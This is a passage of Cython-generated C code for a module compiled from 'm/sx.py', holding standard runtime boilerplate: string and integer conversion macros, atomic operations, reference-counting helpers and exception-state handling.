<cstdlib>\n    #define __Pyx_sst_abs(value) std::abs(value)\n#elif SIZEOF_INT >= SIZEOF_SIZE_T\n    #define __Pyx_sst_abs(value) abs(value)\n#elif SIZEOF_LONG >= SIZEOF_SIZE_T\n    #define __Pyx_sst_abs(value) labs(value)\n#elif defined (_MSC_VER)\n    #define __Pyx_sst_abs(value) ((Py_ssize_t)_abs64(value))\n#elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L\n    #define __Pyx_sst_abs(value) llabs(value)\n#elif defined (__GNUC__)\n    #define __Pyx_sst_abs(value) __builtin_llabs(value)\n#else\n    #define __Pyx_sst_abs(value) ((value<0) ? -value : value)\n#endif\nstatic CYTHON_INLINE Py_ssize_t __Pyx_ssize_strlen(const char *s);\nstatic CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject*);\nstatic CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject*, Py_ssize_t* length);\nstatic CYTHON_INLINE PyObject* __Pyx_PyByteArray_FromString(const char*);\n#define __Pyx_PyByteArray_FromStringAndSize(s, l) PyByteArray_FromStringAndSize((const char*)s, l)\n#define __Pyx_PyBytes_FromString        PyBytes_FromString\n#define __Pyx_PyBytes_FromStringAndSize PyBytes_FromStringAndSize\nstatic CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char*);\n#if CYTHON_ASSUME_SAFE_MACROS\n    #define __Pyx_PyBytes_AsWritableString(s)     ((char*) PyBytes_AS_STRING(s))\n    #define __Pyx_PyBytes_AsWritableSString(s)    ((signed char*) PyBytes_AS_STRING(s))\n    #define __Pyx_PyBytes_AsWritableUString(s)    ((unsigned char*) PyBytes_AS_STRING(s))\n    #define __Pyx_PyBytes_AsString(s)     ((const char*) PyBytes_AS_STRING(s))\n    #define __Pyx_PyBytes_AsSString(s)    ((const signed char*) PyBytes_AS_STRING(s))\n    #define __Pyx_PyBytes_AsUString(s)    ((const unsigned char*) PyBytes_AS_STRING(s))\n    #define __Pyx_PyByteArray_AsString(s) PyByteArray_AS_STRING(s)\n#else\n    #define __Pyx_PyBytes_AsWritableString(s)     ((char*) PyBytes_AsString(s))\n    #define __Pyx_PyBytes_AsWritableSString(s)    ((signed char*) PyBytes_AsString(s))\n    #define __Pyx_PyBytes_AsWritableUString(s)    ((unsigned char*) PyBytes_AsString(s))\n    #define __Pyx_PyBytes_AsString(s)     ((const char*) PyBytes_AsString(s))\n    #define __Pyx_PyBytes_AsSString(s)    ((const signed char*) PyBytes_AsString(s))\n    #define __Pyx_PyBytes_AsUString(s)    ((const unsigned char*) PyBytes_AsString(s))\n    #define __Pyx_PyByteArray_AsString(s) PyByteArray_AsString(s)\n#endif\n#define __Pyx_PyObject_AsWritableString(s)    ((char*)(__pyx_uintptr_t) __Pyx_PyObject_AsString(s))\n#define __Pyx_PyObject_AsWritableSString(s)    ((signed char*)(__pyx_uintptr_t) __Pyx_PyObject_AsString(s))\n#define __Pyx_PyObject_AsWritableUString(s)    ((unsigned char*)(__pyx_uintptr_t) __Pyx_PyObject_AsString(s))\n#define __Pyx_PyObject_AsSString(s)    ((const signed char*) __Pyx_PyObject_AsString(s))\n#define __Pyx_PyObject_AsUString(s)    ((const unsigned char*) __Pyx_PyObject_AsString(s))\n#define __Pyx_PyObject_FromCString(s)  __Pyx_PyObject_FromString((const char*)s)\n#define __Pyx_PyBytes_FromCString(s)   __Pyx_PyBytes_FromString((const char*)s)\n#define __Pyx_PyByteArray_FromCString(s)   __Pyx_PyByteArray_FromString((const char*)s)\n#define __Pyx_PyUnicode_FromCString(s) __Pyx_PyUnicode_FromString((const char*)s)\n#define __Pyx_PyUnicode_FromOrdinal(o)       PyUnicode_FromOrdinal((int)o)\n#define __Pyx_PyUnicode_AsUnicode            PyUnicode_AsUnicode\nstatic CYTHON_INLINE PyObject *__Pyx_NewRef(PyObject *obj) {\n#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030a0000 || defined(Py_NewRef)\n    return Py_NewRef(obj);\n#else\n    Py_INCREF(obj);\n    return obj;\n#endif\n}\nstatic CYTHON_INLINE PyObject *__Pyx_XNewRef(PyObject *obj) {\n#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030a0000 || defined(Py_XNewRef)\n    return Py_XNewRef(obj);\n#else\n    Py_XINCREF(obj);\n    return obj;\n#endif\n}\nstatic CYTHON_INLINE PyObject *__Pyx_Owned_Py_None(int b);\nstatic CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b);\nstatic CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject*);\nstatic CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject*);\nstatic CYTHON_INLINE PyObject* __Pyx_PyNumber_Long(PyObject* x);\n#define __Pyx_PySequence_Tuple(obj)\\\n    (likely(PyTuple_CheckExact(obj)) ? __Pyx_NewRef(obj) : PySequence_Tuple(obj))\nstatic CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject*);\nstatic CYTHON_INLINE PyObject * __Pyx_PyLong_FromSize_t(size_t);\nstatic CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject*);\n#if CYTHON_ASSUME_SAFE_MACROS\n#define __Pyx_PyFloat_AsDouble(x) (PyFloat_CheckExact(x) ? PyFloat_AS_DOUBLE(x) : PyFloat_AsDouble(x))\n#define __Pyx_PyFloat_AS_DOUBLE(x) PyFloat_AS_DOUBLE(x)\n#else\n#define __Pyx_PyFloat_AsDouble(x) PyFloat_AsDouble(x)\n#define __Pyx_PyFloat_AS_DOUBLE(x) PyFloat_AsDouble(x)\n#endif\n#define __Pyx_PyFloat_AsFloat(x) ((float) __Pyx_PyFloat_AsDouble(x))\n#define __Pyx_PyNumber_Int(x) (PyLong_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Long(x))\n#if CYTHON_USE_PYLONG_INTERNALS\n  #if PY_VERSION_HEX >= 0x030C00A7\n  #ifndef _PyLong_SIGN_MASK\n    #define _PyLong_SIGN_MASK 3\n  #endif\n  #ifndef _PyLong_NON_SIZE_BITS\n    #define _PyLong_NON_SIZE_BITS 3\n  #endif\n  #define __Pyx_PyLong_Sign(x)  (((PyLongObject*)x)->long_value.lv_tag & _PyLong_SIGN_MASK)\n  #define __Pyx_PyLong_IsNeg(x)  ((__Pyx_PyLong_Sign(x) & 2) != 0)\n  #define __Pyx_PyLong_IsNonNeg(x)  (!__Pyx_PyLong_IsNeg(x))\n  #define __Pyx_PyLong_IsZero(x)  (__Pyx_PyLong_Sign(x) & 1)\n  #define __Pyx_PyLong_IsPos(x)  (__Pyx_PyLong_Sign(x) == 0)\n  #define __Pyx_PyLong_CompactValueUnsigned(x)  (__Pyx_PyLong_Digits(x)[0])\n  #define __Pyx_PyLong_DigitCount(x)  ((Py_ssize_t) (((PyLongObject*)x)->long_value.lv_tag >> _PyLong_NON_SIZE_BITS))\n  #define __Pyx_PyLong_SignedDigitCount(x)\\\n        ((1 - (Py_ssize_t) __Pyx_PyLong_Sign(x)) * __Pyx_PyLong_DigitCount(x))\n  #if defined(PyUnstable_Long_IsCompact) && defined(PyUnstable_Long_CompactValue)\n    #define __Pyx_PyLong_IsCompact(x)     PyUnstable_Long_IsCompact((PyLongObject*) x)\n    #define __Pyx_PyLong_CompactValue(x)  PyUnstable_Long_CompactValue((PyLongObject*) x)\n  #else\n    #define __Pyx_PyLong_IsCompact(x)     (((PyLongObject*)x)->long_value.lv_tag < (2 << _PyLong_NON_SIZE_BITS))\n    #define __Pyx_PyLong_CompactValue(x)  ((1 - (Py_ssize_t) __Pyx_PyLong_Sign(x)) * (Py_ssize_t) __Pyx_PyLong_Digits(x)[0])\n  #endif\n  typedef Py_ssize_t  __Pyx_compact_pylong;\n  typedef size_t  __Pyx_compact_upylong;\n  #else\n  #define __Pyx_PyLong_IsNeg(x)  (Py_SIZE(x) < 0)\n  #define __Pyx_PyLong_IsNonNeg(x)  (Py_SIZE(x) >= 0)\n  #define __Pyx_PyLong_IsZero(x)  (Py_SIZE(x) == 0)\n  #define __Pyx_PyLong_IsPos(x)  (Py_SIZE(x) > 0)\n  #define __Pyx_PyLong_CompactValueUnsigned(x)  ((Py_SIZE(x) == 0) ? 0 : __Pyx_PyLong_Digits(x)[0])\n  #define __Pyx_PyLong_DigitCount(x)  __Pyx_sst_abs(Py_SIZE(x))\n  #define __Pyx_PyLong_SignedDigitCount(x)  Py_SIZE(x)\n  #define __Pyx_PyLong_IsCompact(x)  (Py_SIZE(x) == 0 || Py_SIZE(x) == 1 || Py_SIZE(x) == -1)\n  #define __Pyx_PyLong_CompactValue(x)\\\n        ((Py_SIZE(x) == 0) ? (sdigit) 0 : ((Py_SIZE(x) < 0) ? -(sdigit)__Pyx_PyLong_Digits(x)[0] : (sdigit)__Pyx_PyLong_Digits(x)[0]))\n  typedef sdigit  __Pyx_compact_pylong;\n  typedef digit  __Pyx_compact_upylong;\n  #endif\n  #if PY_VERSION_HEX >= 0x030C00A5\n  #define __Pyx_PyLong_Digits(x)  (((PyLongObject*)x)->long_value.ob_digit)\n  #else\n  #define __Pyx_PyLong_Digits(x)  (((PyLongObject*)x)->ob_digit)\n  #endif\n#endif\n#if __PYX_DEFAULT_STRING_ENCODING_IS_UTF8\n  #define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_DecodeUTF8(c_str, size, NULL)\n#elif __PYX_DEFAULT_STRING_ENCODING_IS_ASCII\n  #define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_DecodeASCII(c_str, size, NULL)\n#else\n  #define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_Decode(c_str, size, __PYX_DEFAULT_STRING_ENCODING, NULL)\n#endif\n\n\n\n#if defined(__GNUC__)     && (__GNUC__ > 2 || (__GNUC__ == 2 && (__GNUC_MINOR__ > 95)))\n  #define likely(x)   __builtin_expect(!!(x), 1)\n  #define unlikely(x) __builtin_expect(!!(x), 0)\n#else \n  #define likely(x)   (x)\n  #define unlikely(x) (x)\n#endif \n\n#ifdef __cplusplus\n#if __cplusplus > 201103L\n#include <type_traits>\n#endif\ntemplate <typename T>\nstatic void __Pyx_pretend_to_initialize(T* ptr) {\n#if __cplusplus > 201103L\n    if ((std::is_trivially_default_constructible<T>::value))\n#endif\n        *ptr = T();\n    (void)ptr;\n}\n#else\nstatic CYTHON_INLINE void __Pyx_pretend_to_initialize(void* ptr) { (void)ptr; }\n#endif\n\n\n#if !CYTHON_USE_MODULE_STATE\nstatic PyObject *__pyx_m = NULL;\n#endif\nstatic int __pyx_lineno;\nstatic int __pyx_clineno = 0;\nstatic const char * const __pyx_cfilenm = __FILE__;\nstatic const char *__pyx_filename;\n\n\n\nstatic const char* const __pyx_f[] = {\n  "m/sx.py",\n};\n\n\n#if !CYTHON_COMPILING_IN_CPYTHON_FREETHREADING\n#define __Pyx_PyCriticalSection void*\n#define __Pyx_PyCriticalSection2 void*\n#define __Pyx_PyCriticalSection_Begin1(cs, arg) (void)cs\n#define __Pyx_PyCriticalSection_Begin2(cs, arg1, arg2) (void)cs\n#define __Pyx_PyCriticalSection_End1(cs)\n#define __Pyx_PyCriticalSection_End2(cs)\n#else\n#define __Pyx_PyCriticalSection PyCriticalSection\n#define __Pyx_PyCriticalSection2 PyCriticalSection2\n#define __Pyx_PyCriticalSection_Begin1 PyCriticalSection_Begin\n#define __Pyx_PyCriticalSection_Begin2 PyCriticalSection2_Begin\n#define __Pyx_PyCriticalSection_End1 PyCriticalSection_End\n#define __Pyx_PyCriticalSection_End2 PyCriticalSection2_End\n#endif\n#if PY_VERSION_HEX < 0x030d0000 || CYTHON_COMPILING_IN_LIMITED_API\n#define __Pyx_BEGIN_CRITICAL_SECTION(o) {\n#define __Pyx_END_CRITICAL_SECTION() }\n#else\n#define __Pyx_BEGIN_CRITICAL_SECTION Py_BEGIN_CRITICAL_SECTION\n#define __Pyx_END_CRITICAL_SECTION Py_END_CRITICAL_SECTION\n#endif\n\n\n#include <pythread.h>\n#ifndef CYTHON_ATOMICS\n    #define CYTHON_ATOMICS 1\n#endif\n#define __PYX_CYTHON_ATOMICS_ENABLED() CYTHON_ATOMICS\n#define __PYX_GET_CYTHON_COMPILING_IN_CPYTHON_FREETHREADING() CYTHON_COMPILING_IN_CPYTHON_FREETHREADING\n#define __pyx_atomic_int_type int\n#define __pyx_nonatomic_int_type int\n#if CYTHON_ATOMICS && (defined(__STDC_VERSION__) &&\\\n                        (__STDC_VERSION__ >= 201112L) &&\\\n                        !defined(__STDC_NO_ATOMICS__))\n    #include <stdatomic.h>\n#elif CYTHON_ATOMICS && (defined(__cplusplus) && (\\\n                    (__cplusplus >= 201103L) ||\\\n                    (defined(_MSC_VER) && _MSC_VER >= 1700)))\n    #include <atomic>\n#endif\n#if CYTHON_ATOMICS && (defined(__STDC_VERSION__) &&\\\n                        (__STDC_VERSION__ >= 201112L) &&\\\n                        !defined(__STDC_NO_ATOMICS__) &&\\\n                       ATOMIC_INT_LOCK_FREE == 2)\n    #undef __pyx_atomic_int_type\n    #define __pyx_atomic_int_type atomic_int\n    #define __pyx_atomic_ptr_type atomic_uintptr_t\n    #define __pyx_nonatomic_ptr_type uintptr_t\n    #define __pyx_atomic_incr_relaxed(value) atomic_fetch_add_explicit(value, 1, memory_order_relaxed)\n    #define __pyx_atomic_incr_acq_rel(value) atomic_fetch_add_explicit(value, 1, memory_order_acq_rel)\n    #define __pyx_atomic_decr_acq_rel(value) atomic_fetch_sub_explicit(value, 1, memory_order_acq_rel)\n    #define __pyx_atomic_sub(value, arg) atomic_fetch_sub(value, arg)\n    #define __pyx_atomic_int_cmp_exchange(value, expected, desired) atomic_compare_exchange_strong(value, expected, desired)\n    #define __pyx_atomic_load(value) atomic_load(value)\n    #define __pyx_atomic_store(value, new_value) atomic_store(value, new_value)\n    #define __pyx_atomic_pointer_load_relaxed(value) atomic_load_explicit(value, memory_order_relaxed)\n    #define __pyx_atomic_pointer_load_acquire(value) atomic_load_explicit(value, memory_order_acquire)\n    #define __pyx_atomic_pointer_exchange(value, new_value) atomic_exchange(value, (__pyx_nonatomic_ptr_type)new_value)\n    #if defined(__PYX_DEBUG_ATOMICS) && defined(_MSC_VER)\n        #pragma message ("Using standard C atomics")\n    #elif defined(__PYX_DEBUG_ATOMICS)\n        #warning "Using standard C atomics"\n    #endif\n#elif CYTHON_ATOMICS && (defined(__cplusplus) && (\\\n                    (__cplusplus >= 201103L) ||\\\n\\\n                    (defined(_MSC_VER) && _MSC_VER >= 1700)) &&\\\n                    ATOMIC_INT_LOCK_FREE == 2)\n    #undef __pyx_atomic_int_type\n    #define __pyx_atomic_int_type std::atomic_int\n    #define __pyx_atomic_ptr_type std::atomic_uintptr_t\n    #define __pyx_nonatomic_ptr_type uintptr_t\n    #define __pyx_atomic_incr_relaxed(value) std::atomic_fetch_add_explicit(value, 1, std::memory_order_relaxed)\n    #define __pyx_atomic_incr_acq_rel(value) std::atomic_fetch_add_explicit(value, 1, std::memory_order_acq_rel)\n    #define __pyx_atomic_decr_acq_rel(value) std::atomic_fetch_sub_explicit(value, 1, std::memory_order_acq_rel)\n    #define __pyx_atomic_sub(value, arg) std::atomic_fetch_sub(value, arg)\n    #define __pyx_atomic_int_cmp_exchange(value, expected, desired) std::atomic_compare_exchange_strong(value, expected, desired)\n    #define __pyx_atomic_load(value) std::atomic_load(value)\n    #define __pyx_atomic_store(value, new_value) std::atomic_store(value, new_value)\n    #define __pyx_atomic_pointer_load_relaxed(value) std::atomic_load_explicit(value, std::memory_order_relaxed)\n    #define __pyx_atomic_pointer_load_acquire(value) std::atomic_load_explicit(value, std::memory_order_acquire)\n    #define __pyx_atomic_pointer_exchange(value, new_value) std::atomic_exchange(value, (__pyx_nonatomic_ptr_type)new_value)\n    #if defined(__PYX_DEBUG_ATOMICS) && defined(_MSC_VER)\n        #pragma message ("Using standard C++ atomics")\n    #elif defined(__PYX_DEBUG_ATOMICS)\n        #warning "Using standard C++ atomics"\n    #endif\n#elif CYTHON_ATOMICS && (__GNUC__ >= 5 || (__GNUC__ == 4 &&\\\n                    (__GNUC_MINOR__ > 1 ||\\\n                    (__GNUC_MINOR__ == 1 && __GNUC_PATCHLEVEL__ >= 2))))\n    #define __pyx_atomic_ptr_type void*\n    #define __pyx_atomic_incr_relaxed(value) __sync_fetch_and_add(value, 1)\n    #define __pyx_atomic_incr_acq_rel(value) __sync_fetch_and_add(value, 1)\n    #define __pyx_atomic_decr_acq_rel(value) __sync_fetch_and_sub(value, 1)\n    #define __pyx_atomic_sub(value, arg) __sync_fetch_and_sub(value, arg)\n    static CYTHON_INLINE int __pyx_atomic_int_cmp_exchange(__pyx_atomic_int_type* value, __pyx_nonatomic_int_type* expected, __pyx_nonatomic_int_type desired) {\n        __pyx_nonatomic_int_type old = __sync_val_compare_and_swap(value, *expected, desired);\n        int result = old == *expected;\n        *expected = old;\n        return result;\n    }\n    #define __pyx_atomic_load(value) __sync_fetch_and_add(value, 0)\n    #define __pyx_atomic_store(value, new_value) __sync_lock_test_and_set(value, new_value)\n    #define __pyx_atomic_pointer_load_relaxed(value) __sync_fetch_and_add(value, 0)\n    #define __pyx_atomic_pointer_load_acquire(value) __sync_fetch_and_add(value, 0)\n    #define __pyx_atomic_pointer_exchange(value, new_value) __sync_lock_test_and_set(value, (__pyx_atomic_ptr_type)new_value)\n    #ifdef __PYX_DEBUG_ATOMICS\n        #warning "Using GNU atomics"\n    #endif\n#elif CYTHON_ATOMICS && defined(_MSC_VER)\n    #include <intrin.h>\n    #undef __pyx_atomic_int_type\n    #define __pyx_atomic_int_type long\n    #define __pyx_atomic_ptr_type void*\n    #undef __pyx_nonatomic_int_type\n    #define __pyx_nonatomic_int_type long\n    #pragma intrinsic (_InterlockedExchangeAdd, _InterlockedExchange, _InterlockedCompareExchange, _InterlockedCompareExchangePointer, _InterlockedExchangePointer)\n    #define __pyx_atomic_incr_relaxed(value) _InterlockedExchangeAdd(value, 1)\n    #define __pyx_atomic_incr_acq_rel(value) _InterlockedExchangeAdd(value, 1)\n    #define __pyx_atomic_decr_acq_rel(value) _InterlockedExchangeAdd(value, -1)\n    #define __pyx_atomic_sub(value, arg) _InterlockedExchangeAdd(value, -arg)\n    static CYTHON_INLINE int __pyx_atomic_int_cmp_exchange(__pyx_atomic_int_type* value, __pyx_nonatomic_int_type* expected, __pyx_nonatomic_int_type desired) {\n        __pyx_nonatomic_int_type old = _InterlockedCompareExchange(value, desired, *expected);\n        int result = old == *expected;\n        *expected = old;\n        return result;\n    }\n    #define __pyx_atomic_load(value) _InterlockedExchangeAdd(value, 0)\n    #define __pyx_atomic_store(value, new_value) _InterlockedExchange(value, new_value)\n    #define __pyx_atomic_pointer_load_relaxed(value) *(void * volatile *)value\n    #define __pyx_atomic_pointer_load_acquire(value) _InterlockedCompareExchangePointer(value, 0, 0)\n    #define __pyx_atomic_pointer_exchange(value, new_value) _InterlockedExchangePointer(value, (__pyx_atomic_ptr_type)new_value)\n    #ifdef __PYX_DEBUG_ATOMICS\n        #pragma message ("Using MSVC atomics")\n    #endif\n#else\n    #undef CYTHON_ATOMICS\n    #define CYTHON_ATOMICS 0\n    #ifdef __PYX_DEBUG_ATOMICS\n        #warning "Not using atomics"\n    #endif\n#endif\n#if CYTHON_ATOMICS\n    #define __pyx_add_acquisition_count(memview)\\\n             __pyx_atomic_incr_relaxed(__pyx_get_slice_count_pointer(memview))\n    #define __pyx_sub_acquisition_count(memview)\\\n            __pyx_atomic_decr_acq_rel(__pyx_get_slice_count_pointer(memview))\n#else\n    #define __pyx_add_acquisition_count(memview)\\\n            __pyx_add_acquisition_count_locked(__pyx_get_slice_count_pointer(memview), memview->lock)\n    #define __pyx_sub_acquisition_count(memview)\\\n            __pyx_sub_acquisition_count_locked(__pyx_get_slice_count_pointer(memview), memview->lock)\n#endif\n\n\n\n\n\n\n\n\n\n\n#ifndef CYTHON_REFNANNY\n  #define CYTHON_REFNANNY 0\n#endif\n#if CYTHON_REFNANNY\n  typedef struct {\n    void (*INCREF)(void*, PyObject*, Py_ssize_t);\n    void (*DECREF)(void*, PyObject*, Py_ssize_t);\n    void (*GOTREF)(void*, PyObject*, Py_ssize_t);\n    void (*GIVEREF)(void*, PyObject*, Py_ssize_t);\n    void* (*SetupContext)(const char*, Py_ssize_t, const char*);\n    void (*FinishContext)(void**);\n  } __Pyx_RefNannyAPIStruct;\n  static __Pyx_RefNannyAPIStruct *__Pyx_RefNanny = NULL;\n  static __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname);\n  #define __Pyx_RefNannyDeclarations void *__pyx_refnanny = NULL;\n  #define __Pyx_RefNannySetupContext(name, acquire_gil)\\\n          if (acquire_gil) {\\\n              PyGILState_STATE __pyx_gilstate_save = PyGILState_Ensure();\\\n              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), (__LINE__), (__FILE__));\\\n              PyGILState_Release(__pyx_gilstate_save);\\\n          } else {\\\n              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), (__LINE__), (__FILE__));\\\n          }\n  #define __Pyx_RefNannyFinishContextNogil() {\\\n              PyGILState_STATE __pyx_gilstate_save = PyGILState_Ensure();\\\n              __Pyx_RefNannyFinishContext();\\\n              PyGILState_Release(__pyx_gilstate_save);\\\n          }\n  #define __Pyx_RefNannyFinishContextNogil() {\\\n              PyGILState_STATE __pyx_gilstate_save = PyGILState_Ensure();\\\n              __Pyx_RefNannyFinishContext();\\\n              PyGILState_Release(__pyx_gilstate_save);\\\n          }\n  #define __Pyx_RefNannyFinishContext()\\\n          __Pyx_RefNanny->FinishContext(&__pyx_refnanny)\n  #define __Pyx_INCREF(r)  __Pyx_RefNanny->INCREF(__pyx_refnanny, (PyObject *)(r), (__LINE__))\n  #define __Pyx_DECREF(r)  __Pyx_RefNanny->DECREF(__pyx_refnanny, (PyObject *)(r), (__LINE__))\n  #define __Pyx_GOTREF(r)  __Pyx_RefNanny->GOTREF(__pyx_refnanny, (PyObject *)(r), (__LINE__))\n  #define __Pyx_GIVEREF(r) __Pyx_RefNanny->GIVEREF(__pyx_refnanny, (PyObject *)(r), (__LINE__))\n  #define __Pyx_XINCREF(r)  do { if((r) == NULL); else {__Pyx_INCREF(r); }} while(0)\n  #define __Pyx_XDECREF(r)  do { if((r) == NULL); else {__Pyx_DECREF(r); }} while(0)\n  #define __Pyx_XGOTREF(r)  do { if((r) == NULL); else {__Pyx_GOTREF(r); }} while(0)\n  #define __Pyx_XGIVEREF(r) do { if((r) == NULL); else {__Pyx_GIVEREF(r);}} while(0)\n#else\n  #define __Pyx_RefNannyDeclarations\n  #define __Pyx_RefNannySetupContext(name, acquire_gil)\n  #define __Pyx_RefNannyFinishContextNogil()\n  #define __Pyx_RefNannyFinishContext()\n  #define __Pyx_INCREF(r) Py_INCREF(r)\n  #define __Pyx_DECREF(r) Py_DECREF(r)\n  #define __Pyx_GOTREF(r)\n  #define __Pyx_GIVEREF(r)\n  #define __Pyx_XINCREF(r) Py_XINCREF(r)\n  #define __Pyx_XDECREF(r) Py_XDECREF(r)\n  #define __Pyx_XGOTREF(r)\n  #define __Pyx_XGIVEREF(r)\n#endif\n#define __Pyx_Py_XDECREF_SET(r, v) do {\\\n        PyObject *tmp = (PyObject *) r;\\\n        r = v; Py_XDECREF(tmp);\\\n    } while (0)\n#define __Pyx_XDECREF_SET(r, v) do {\\\n        PyObject *tmp = (PyObject *) r;\\\n        r = v; __Pyx_XDECREF(tmp);\\\n    } while (0)\n#define __Pyx_DECREF_SET(r, v) do {\\\n        PyObject *tmp = (PyObject *) r;\\\n        r = v; __Pyx_DECREF(tmp);\\\n    } while (0)\n#define __Pyx_CLEAR(r)    do { PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);} while(0)\n#define __Pyx_XCLEAR(r)   do { if((r) != NULL) {PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);}} while(0)\n\n\n#if CYTHON_FAST_THREAD_STATE\n#define __Pyx_PyErr_ExceptionMatches(err) __Pyx_PyErr_ExceptionMatchesInState(__pyx_tstate, err)\nstatic CYTHON_INLINE int __Pyx_PyErr_ExceptionMatchesInState(PyThreadState* tstate, PyObject* err);\n#else\n#define __Pyx_PyErr_ExceptionMatches(err)  PyErr_ExceptionMatches(err)\n#endif\n\n\n#if CYTHON_FAST_THREAD_STATE\n#define __Pyx_PyThreadState_declare  PyThreadState *__pyx_tstate;\n#define __Pyx_PyThreadState_assign  __pyx_tstate = __Pyx_PyThreadState_Current;\n#if PY_VERSION_HEX >= 0x030C00A6\n#define __Pyx_PyErr_Occurred()  (__pyx_tstate->current_exception != NULL)\n#define __Pyx_PyErr_CurrentExceptionType()  (__pyx_tstate->current_exception ? (PyObject*) Py_TYPE(__pyx_tstate->current_exception) : (PyObject*) NULL)\n#else\n#define __Pyx_PyErr_Occurred()  (__pyx_tstate->curexc_type != NULL)\n#define __Pyx_PyErr_CurrentExceptionType()  (__pyx_tstate->curexc_type)\n#endif\n#else\n#define __Pyx_PyThreadState_declare\n#define __Pyx_PyThreadState_assign\n#define __Pyx_PyErr_Occurred()  (PyErr_Occurred() != NULL)\n#define __Pyx_PyErr_CurrentExceptionType()  PyErr_Occurred()\n#endif\n\n\n#if CYTHON_FAST_THREAD_STATE\n#define __Pyx_PyErr_Clear() __Pyx_ErrRestore(NULL, NULL, NULL)\n#define __Pyx_ErrRestoreWithState(type, value, tb)  __Pyx_ErrRestoreInState(PyThreadState_GET(), type, value, tb)\n#define __Pyx_ErrFetchWithState(type, value, tb)    __Pyx_ErrFetchInState(PyThreadState_GET(), type, value, tb)\n#define __Pyx_ErrRestore(type, value, tb)  __Pyx_ErrRestoreInState(__pyx_tstate, type, value, tb)\n#define __Pyx_ErrFetch(type, value, tb)    __Pyx_ErrFetchInState(__pyx_tstate, type, value, tb)\nstatic CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb);\nstatic CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);\n#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX < 0x030C00A6\n#define __Pyx_PyErr_SetNone(exc) (Py_INCREF(exc), __Pyx_ErrRestore((exc), NULL, NULL))\n#else\n#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)\n#endif\n#else\n#define __Pyx_PyErr_Clear() PyErr_Clear()\n#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)\n#define __Pyx_ErrRestoreWithState(type, value, tb)  PyErr_Restore(type, value, tb)\n#define __Pyx_ErrFetchWithState(type, value, tb)  PyErr_Fetch(type, value, tb)\n#define __Pyx_ErrRestoreInState(tstate, type, value, tb)  PyErr_Restore(type, value, tb)\n#define __Pyx_ErrFetchInState(tstate, type, value, tb)  PyErr_Fetch(type, value, tb)\n#define __Pyx_ErrRestore(type, value, tb)  PyErr_Restore(type, value, tb)\n#define __Pyx_ErrFetch(type, value, tb)  PyErr_Fetch(type, value, tb)\n#endif\n\n\n#if CYTHON_USE_TYPE_SLOTS\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name);\n#else\n#define __Pyx_PyObject_GetAttrStr(o,n) PyObject_GetAttr(o,n)\n#endif\n\n\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStrNoError(PyObject* obj, PyObject* attr_name);\n\n\nstatic PyObject *__Pyx_GetBuiltinName(PyObject *name);\n\n\n#include <string.h>\n\n\nstatic PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level);\n\n\nstatic PyObject *__Pyx_ImportDottedModule(PyObject *name, PyObject *parts_tuple);\nstatic PyObject *__Pyx_ImportDottedModule_WalkParts(PyObject *module, PyObject *name, PyObject *parts_tuple);\n\n\n#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS\n#define __PYX_DICT_VERSION_INIT  ((PY_UINT64_T) -1)\n#define __PYX_GET_DICT_VERSION(dict)  (((PyDictObject*)(dict))->ma_version_tag)\n#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)\\\n    (version_var) = __PYX_GET_DICT_VERSION(dict);\\\n    (cache_var) = (value);\n#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP) {\\\n    static PY_UINT64_T __pyx_dict_version = 0;\\\n    static PyObject *__pyx_dict_cached_value = NULL;\\\n    if (likely(__PYX_GET_DICT_VERSION(DICT) == __pyx_dict_version)) {\\\n        (VAR) = __pyx_dict_cached_value;\\\n    } else {\\\n        (VAR) = __pyx_dict_cached_value = (LOOKUP);\\\n        __pyx_dict_version = __PYX_GET_DICT_VERSION(DICT);\\\n    }\\\n}\nstatic CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj);\nstatic CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj);\nstatic CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version);\n#else\n#define __PYX_GET_DICT_VERSION(dict)  (0)\n#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)\n#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP)  (VAR) = (LOOKUP);\n#endif\n\n\n#if CYTHON_USE_DICT_VERSIONS\n#define __Pyx_GetModuleGlobalName(var, name)  do {\\\n    static PY_UINT64_T __pyx_dict_version = 0;\\\n    static PyObject *__pyx_dict_cached_value 